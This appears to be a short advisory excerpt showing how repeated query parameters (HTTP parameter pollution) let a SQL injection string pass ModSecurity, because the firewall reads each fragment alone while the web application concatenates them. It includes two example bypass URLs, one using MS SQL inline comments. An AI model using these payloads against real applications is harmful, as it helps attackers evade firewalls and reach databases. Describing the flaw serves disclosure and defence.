The following examples are available to demonstrate this issue:

http://www.example.com/search.aspx?value=select 1&amp;value=2,3 from table

ModSecurity Interpretation:
value = select 1
value = 2,3 from table
Web Application Interpretation:
value select 1,2,3 from table

The attack can be made more flexible by using the inline comment feature in MS SQL servers:

http://www.example.com/search.aspx?value=select/*&amp;value=*/1,2,3/*&amp;value=*/from/*&amp;value=*/table

ModSecurity Interpretation:
value=select/*
value=*/1,2,3/*
value=*/from/*
value=*/table
Web Application Interpretation:
value = select/*,*/1,2,3/*,*/from/*,*/table
